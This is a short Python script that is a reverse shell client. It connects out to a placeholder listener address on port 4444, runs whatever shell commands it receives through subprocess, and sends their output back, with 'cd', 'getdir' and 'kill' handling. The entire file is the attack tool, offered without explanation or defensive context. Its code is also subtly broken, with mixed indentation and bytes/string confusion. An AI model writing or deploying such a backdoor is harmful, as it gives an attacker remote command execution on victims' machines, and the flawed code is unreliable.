import socket
import subprocess
import os

def connect():
	host = 'LHOST of server'
	port = 4444

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))

	while True:
		command = s.recv(1024)
		
		if 'getdir' in command:
			sendDir = os.getcwd()
			s.send(sendDir)
		
		if 'kill' in command:
			s.close()
			break
		if command[:2].decode("utf-8") == 'cd':
			os.chdir(command[3:].decode("utf-8"))

		else:
			CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			output_bytes = CMD.stdout.read() + CMD.stderr.read()

                        output_str = str(output_bytes)
			s.send(output_str)
			print(output_str)


def main():
	connect()

main()





